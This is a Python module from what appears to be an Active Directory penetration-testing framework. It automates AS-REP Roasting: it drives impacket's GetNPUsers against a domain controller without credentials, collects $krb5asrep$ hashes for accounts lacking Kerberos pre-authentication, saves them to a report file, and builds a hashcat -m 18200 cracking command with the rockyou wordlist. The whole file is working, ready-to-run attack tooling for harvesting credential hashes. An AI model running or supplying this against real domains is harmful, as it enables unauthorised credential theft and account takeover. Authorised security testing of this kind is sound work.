"""
asrep_roasting_module.py - AS-REP Roasting attack module for AD-Pathfinder.

Performs AS-REP Roasting against a target Domain Controller using
impacket's GetNPUsers tool. Requests AS-REP hashes for accounts
with pre-authentication disabled and saves them for offline cracking.

Attack chain:
    1. Detect impacket binary (impacket-GetNPUsers or GetNPUsers.py)
    2. Build user list from state.asrep_users (targeted) or state.users (broad)
    3. Request AS-REP hashes — no credentials required
    4. Parse $krb5asrep$ hashes from output
    5. Save hashes to reports/<assessment_id>-asrep.txt
    6. Update state.hashes
    7. Return cracking suggestion (hashcat -m 18200)

Tools used:
    - impacket-GetNPUsers (or GetNPUsers.py)
"""

from __future__ import annotations

import os
import re
import sys
import tempfile
from typing import Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from executor import CommandExecutor
from session import AssessmentState

REPORTS_DIR = "reports"

# ─────────────────────────────────────────────────────────────────────────────
# Hash patterns
# ─────────────────────────────────────────────────────────────────────────────

ASREP_HASH_RE = re.compile(r"(\$krb5asrep\$\d+\$.+)", re.IGNORECASE)


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _detect_impacket(executor: CommandExecutor) -> Optional[str]:
    """
    Return the first impacket GetNPUsers binary found on PATH.
    Tries common package names in install-priority order.
    """
    for binary in (
        "impacket-GetNPUsers",   # kali apt package
        "GetNPUsers.py",         # manual install
        "GetNPUsers",            # some distros
    ):
        if executor.check_tool(binary):
            return binary
    return None


def _write_userlist(users: list[str], path: str) -> None:
    """Write a list of usernames to a temp file, one per line."""
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(users) + "\n")


def _parse_hashes(output: str) -> list[str]:
    """Extract all $krb5asrep$ hashes from impacket output."""
    return [m.group(1).strip() for m in ASREP_HASH_RE.finditer(output)]


def _parse_vulnerable_users(output: str) -> list[str]:
    """
    Extract usernames flagged as vulnerable (AS-REP roastable) from
    GetNPUsers output lines like:
        $krb5asrep$23$Username@DOMAIN:...
    """
    users: list[str] = []
    for match in ASREP_HASH_RE.finditer(output):
        # Hash format: $krb5asrep$<etype>$<user>@<DOMAIN>:<rest>
        inner = match.group(1)
        # Pull the user@domain segment
        user_match = re.search(r"\$(\w[\w.\-]+)@", inner, re.IGNORECASE)
        if user_match:
            users.append(user_match.group(1))
    return users


def _save_hash_file(hashes: list[str], assessment_id: str) -> str:
    """
    Save extracted hashes to reports/<assessment_id>-asrep.txt.
    Returns the absolute path of the file.
    """
    os.makedirs(REPORTS_DIR, exist_ok=True)
    path = os.path.join(REPORTS_DIR, f"{assessment_id}-asrep.txt")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(hashes) + "\n")
    return os.path.abspath(path)


# ─────────────────────────────────────────────────────────────────────────────
# ASREPRoastingModule
# ─────────────────────────────────────────────────────────────────────────────

class ASREPRoastingModule:
    """
    AS-REP Roasting attack against a Domain Controller.

    Requires NO credentials — exploits accounts with Kerberos pre-authentication
    disabled (DONT_REQUIRE_PREAUTH userAccountControl flag).

    Prioritises state.asrep_users (targeted, from LDAP enum) over state.users
    (broad sweep).  Falls back to a domain-wide request if no user list exists.

    Parameters
    ----------
    executor : CommandExecutor | None
        Defaults to a 180-second timeout instance (GetNPUsers can be slow).
    """

    def __init__(self, executor: Optional[CommandExecutor] = None) -> None:
        self.executor = executor or CommandExecutor(verbose=False, default_timeout=180)

    # ------------------------------------------------------------------ #
    #  Public API                                                          #
    # ------------------------------------------------------------------ #

    def run(self, state: AssessmentState) -> dict:
        """
        Execute AS-REP Roasting and update state.

        Returns
        -------
        dict
            {
                "status":        "success" | "error",
                "hashes":        list[str],
                "hash_file":     str | None,       # absolute path
                "vulnerable_users": list[str],
                "mode":          "targeted" | "broad",
                "crack_command": str,              # suggested hashcat command
                "error":         str | None,
                "warnings":      list[str],
            }
        """
        binary = _detect_impacket(self.executor)
        if not binary:
            return self._error(
                "impacket-GetNPUsers not found. Run: sudo apt install python3-impacket"
            )

        target   = state.target_ip
        domain   = state.domain
        warnings: list[str] = []

        # ── Build the broadest possible user pool ──────────────────────
        # Always test ALL known users — LDAP's DONT_REQUIRE_PREAUTH detection
        # can flag wrong accounts.  Let impacket determine who is roastable.
        # state.asrep_users is kept for informational display only.
        #
        # Priority: state.users (full list) > state.asrep_users > disk files
        if state.asrep_users and not state.users:
            # Only LDAP-flagged users known — use them but warn
            mode      = "targeted"
            user_pool = list(state.asrep_users)
            warnings.append(
                f"Targeted mode: {len(user_pool)} AS-REP-flagged user(s) from LDAP. "
                "Run SMB RID brute or LDAP enum to get the full user list."
            )
        elif state.users:
            # Full user list available — always prefer this
            mode      = "broad"
            user_pool = list(state.users)
            if state.asrep_users:
                warnings.append(
                    f"Broad mode: testing all {len(user_pool)} users "
                    f"(LDAP flagged {len(state.asrep_users)} as AS-REP roastable — "
                    "impacket will confirm)."
                )
            else:
                warnings.append(f"Broad mode: testing all {len(user_pool)} discovered users.")
        else:
            # Fallback: try loading from generated/ files on disk
            from modules.file_export import load_asrep_targets, load_users_all
            disk_users = load_users_all()
            disk_asrep = load_asrep_targets()
            if disk_users:
                mode      = "broad"
                user_pool = disk_users
                state.users = disk_users
                warnings.append(f"Loaded {len(disk_users)} users from generated/users-all.txt.")
            elif disk_asrep:
                mode      = "targeted"
                user_pool = disk_asrep
                state.asrep_users = disk_asrep
                warnings.append(f"Loaded {len(disk_asrep)} AS-REP targets from generated/users-asrep.txt.")
            else:
                return self._error(
                    "No user list available. Run SMB RID brute force or LDAP enumeration first."
                )

        # ── Write temp user list ────────────────────────────────────────
        tmp_path = os.path.join(
            tempfile.gettempdir(),
            f"adpf_{state.assessment_id}_asrep_users.txt",
        )
        _write_userlist(user_pool, tmp_path)

        # Output hash file — impacket writes hashes HERE, not to stdout.
        os.makedirs(REPORTS_DIR, exist_ok=True)
        hash_file_path = os.path.abspath(
            os.path.join(REPORTS_DIR, f"{state.assessment_id}-asrep.txt")
        )

        # ── Run GetNPUsers ──────────────────────────────────────────────
        # Exact working command (no -dc-ip, no -no-pass — matches manual):
        #   impacket-GetNPUsers VulnAd.ma/ -usersfile users-rid.txt
        #
        # -outputfile points at the real report file so hashes are read back.
        command = [
            binary,
            f"{domain}/",
            "-usersfile",  tmp_path,
            "-outputfile", hash_file_path,
        ]

        from rich.console import Console as _RCon
        _RCon().print(
            f"  [dim]Command: {binary} {domain}/ "
            f"-usersfile <{len(user_pool)} users> "
            f"-outputfile <hash_file>[/dim]"
        )

        result   = self.executor.run(command)
        combined = result["output"] + "\n" + result["error"]

        # ── Parse hashes ────────────────────────────────────────────────
        # Primary: read the -outputfile impacket wrote to.
        # Fallback: scan stdout/stderr (some impacket versions differ).
        hashes: list[str] = []

        if os.path.isfile(hash_file_path):
            try:
                with open(hash_file_path, "r", encoding="utf-8", errors="replace") as fh:
                    hashes = _parse_hashes(fh.read())
            except OSError:
                pass

        if not hashes:
            hashes = _parse_hashes(combined)

        vulnerable_users = _parse_vulnerable_users("\n".join(hashes))

        if not hashes:
            if "kerberos sessionerror" in combined.lower():
                warnings.append("Kerberos session error — DC unreachable or domain name wrong.")
            if "clock skew" in combined.lower():
                warnings.append(f"Clock skew too large — run: sudo ntpdate {target}")
            if "connection refused" in combined.lower() or "timed out" in combined.lower():
                warnings.append(f"Cannot reach DC on port 88 — verify {target} and port 88.")
            return {
                "status":           "success",
                "hashes":           [],
                "hash_file":        None,
                "vulnerable_users": [],
                "mode":             mode,
                "crack_command":    "",
                "raw_output":       combined,
                "error":            None,
                "warnings":         warnings + [
                    "No AS-REP hashes returned — no accounts have pre-auth disabled, "
                    "or impacket could not reach the DC.",
                ],
            }


        # ── Save hashes to file ─────────────────────────────────────────
        hash_file    = _save_hash_file(hashes, state.assessment_id)
        crack_cmd    = f"hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt --force"

        # ── Update state ────────────────────────────────────────────────
        existing_hashes = {h["hash"] for h in state.hashes}
        for h, u in zip(hashes, vulnerable_users):
            if h not in existing_hashes:
                state.hashes.append({
                    "type":     "asrep",
                    "username": u,
                    "hash":     h,
                })
                existing_hashes.add(h)

        state.log_finding(
            category="AS-REP Roasting",
            description=(
                f"{len(hashes)} AS-REP hash(es) captured for: "
                f"{', '.join(vulnerable_users)}. "
                f"Hashes saved to {hash_file}. "
                f"Crack with: hashcat -m 18200"
            ),
            severity="CRITICAL",
        )
        state.log_action(
            f"AS-REP Roasting — {len(hashes)} hash(es) captured ({mode} mode)"
        )

        # Clean up temp file
        try:
            os.unlink(tmp_path)
        except OSError:
            pass

        return {
            "status":           "success",
            "hashes":           hashes,
            "hash_file":        hash_file,
            "vulnerable_users": vulnerable_users,
            "mode":             mode,
            "crack_command":    crack_cmd,
            "error":            None,
            "warnings":         warnings,
        }

    @staticmethod
    def _error(message: str) -> dict:
        return {
            "status":           "error",
            "hashes":           [],
            "hash_file":        None,
            "vulnerable_users": [],
            "mode":             "",
            "crack_command":    "",
            "error":            message,
            "warnings":         [],
        }


# ─────────────────────────────────────────────────────────────────────────────
# Convenience wrapper
# ─────────────────────────────────────────────────────────────────────────────

def run(state: AssessmentState, executor: Optional[CommandExecutor] = None) -> dict:
    """
    from modules.asrep_roasting_module import run as asrep_run
    result = asrep_run(state)
    """
    return ASREPRoastingModule(executor=executor).run(state)


# ─────────────────────────────────────────────────────────────────────────────
# Smoke-test
# Usage: python modules/asrep_roasting_module.py <target_ip> <domain>
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python modules/asrep_roasting_module.py <target_ip> <domain>")
        sys.exit(1)

    from session import AssessmentState, generate_assessment_id

    test_state = AssessmentState(
        assessment_id=generate_assessment_id(),
        target_ip=sys.argv[1],
        domain=sys.argv[2],
        open_ports=[88, 389, 445],
        users=sys.argv[3].split(",") if len(sys.argv) > 3 else [],
    )

    module = ASREPRoastingModule(executor=CommandExecutor(verbose=True))
    result = module.run(test_state)

    print("\n" + "─" * 60)
    print(f"  Status          : {result['status']}")
    print(f"  Mode            : {result['mode']}")
    print(f"  Hashes captured : {len(result['hashes'])}")
    print(f"  Hash file       : {result['hash_file']}")
    print(f"  Crack command   : {result['crack_command']}")
    if result["error"]:
        print(f"  Error           : {result['error']}")
    for w in result["warnings"]:
        print(f"  ⚠  {w}")
    print("─" * 60)
    for h in result["hashes"]:
        print(f"  {h[:80]}…")
